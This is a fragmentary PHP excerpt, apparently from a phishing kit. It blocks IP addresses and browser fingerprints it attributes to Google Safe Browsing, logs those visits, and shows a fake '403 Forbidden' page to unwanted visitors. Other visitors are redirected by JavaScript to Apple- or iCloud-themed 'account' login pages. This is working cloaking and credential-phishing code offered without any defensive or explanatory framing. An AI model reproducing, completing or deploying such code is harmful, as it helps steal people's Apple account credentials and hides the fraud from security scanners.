...
if($ip2 == "92.23.57.168" or $ip2 == "96.31.1.4" or $ip2 == "207.96.148.8") {
    $file = fopen("block_bot.txt","a");
...
if($os == "Windows Vista" and $br == "Firefox") {
    $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED GOOGLE SAFEBROWSING || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip2." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Google Safebrowsing)"."\n");
...
if($setting['site_param_on'] == "on") {
    ...
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        ...
        $_SESSION['site_parameter'] = $setting['site_parameter'];
    }
}
...
if($setting['theme'] == 'apple'){
    echo "<script type='text/javascript'>window.top.location='account/?view=login&appIdKey=".$key."&country=".$cid."';</script>";
}else if($setting['theme'] == 'icloud') {
    echo "<script type='text/javascript'>window.top.location='account/?view=icloud&appIdKey=".$key."&country=".$cid."';</script>";
}else{
    echo "<script type='text/javascript'>window.top.location='account/?view=classic&appIdKey=".$key."&country=".$cid."';</script>";
}
?>
